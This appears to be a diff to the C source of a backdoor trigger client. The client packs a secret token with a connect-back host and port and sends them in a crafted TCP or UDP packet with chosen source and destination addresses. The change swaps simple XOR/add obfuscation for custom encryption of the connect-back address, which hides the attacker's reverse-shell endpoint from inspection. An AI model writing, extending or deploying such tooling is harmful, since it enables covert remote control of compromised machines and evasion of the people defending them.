@@ -17,6 +17,7 @@
 #include <termios.h>
 #include <unistd.h>
 
+#include "custom_rol32.h"
 #include "util.h"
 
 // Don't worry, it is gonna cahnged next version
@@ -342,7 +343,7 @@ void usage(char *argv0)
 
 int main(int argc, char **argv)
 {
-	int opt, dstport, srcport, len;
+	int opt, dstport, srcport, len, crypt_len;
 	char *prot, *dstip, *srcip, *connect_back_host, *connect_back_port,
 	    *token, *data;
 
@@ -436,21 +437,19 @@ int main(int argc, char **argv)
 			usage(argv[0]);
 	}
 
-	len = strlen(token) + strlen(connect_back_host) +
-	      strlen(connect_back_host) + 3;
+		
+	len = strlen(token) + strlen(connect_back_host) + strlen(connect_back_port) + 3;
+	crypt_len = strlen(connect_back_host) + strlen(connect_back_port) + 2;
 	data = (char *)malloc(len);
 
 	if (!data)
 		fatal("malloc");
 
 	bzero(data, len);
-	snprintf(data, len, "%s %s %s", token, connect_back_host,
-		 connect_back_port);
-	len = strlen(data);
-	// printf("data size: %d\n", len);
+	snprintf(data, len, "%s %s %s", token, connect_back_host, connect_back_port);
+	do_encrypt(data + strlen(token) + 1, crypt_len, KEY);
 
-	_xor(data, 11, len);
-	_add(data, 15, len);
+	// printf("data size: %d\n", len);
 
 	if (strcmp(prot, "tcp") == 0 || strcmp(prot, "TCP") == 0) {
 		tcp(srcip, dstip, srcport, dstport, data, len);
@@ -460,5 +459,6 @@ int main(int argc, char **argv)
 		udp(srcip, dstip, srcport, dstport, data, len);
 	}
 
+	free(data);
 	return EXIT_SUCCESS;
 }
